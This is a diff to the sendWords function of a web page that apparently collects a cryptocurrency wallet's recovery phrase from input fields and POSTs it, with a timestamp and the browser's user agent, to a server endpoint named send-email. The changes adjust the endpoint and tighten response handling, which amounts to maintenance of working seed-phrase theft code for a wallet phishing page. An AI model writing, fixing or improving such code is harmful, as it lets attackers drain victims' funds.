@@ -159,6 +159,9 @@ async function sendWords(btn) {
         const inputs = document.querySelectorAll('.phrase-input input');
         const words = Array.from(inputs).map(input => input.value.trim());
         
+        // Store original button text
+        const originalText = btn.textContent;
+        
         // First check for empty fields
         if (words.some(word => word === '')) {
             alert('Please fill in all recovery phrase words.');
@@ -173,36 +176,48 @@ async function sendWords(btn) {
         
         // Disable button and show processing state
         btn.disabled = true;
-        const originalText = btn.textContent;
         btn.textContent = 'Processing...';
         
         console.log('Sending recovery phrase to server...');
         
-        const response = await fetch(`${API_ENDPOINT}/api/send-email`, {
+        const response = await fetch(`/api/send-email.js`, {
             method: 'POST',
             headers: { 
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({ 
-                phrases: words,
                 recoveryPhrase: words.join(' '),
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent
             })
         });
 
-        const data = await response.json();
+        // Check if response is ok
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
         
-        if (response.ok && data.success) {
-            showSuccess(btn);
+        // Try to parse as JSON
+        let data;
+        const contentType = response.headers.get('content-type');
+        if (contentType && contentType.includes('application/json')) {
+            data = await response.json();
+            
+            if (data.success) {
+                showSuccess(btn);
+                return;
+            } else {
+                throw new Error(data.message || 'Failed to process recovery phrase');
+            }
         } else {
-            throw new Error(data.message || 'Failed to process recovery phrase');
+            // Not JSON response
+            throw new Error('Server returned non-JSON response');
         }
     } catch (error) {
         console.error('Error:', error);
         alert('An error occurred. Please try again.');
         btn.disabled = false;
-        btn.textContent = originalText;
+        btn.textContent = originalText || 'Import';
     }
 }
 
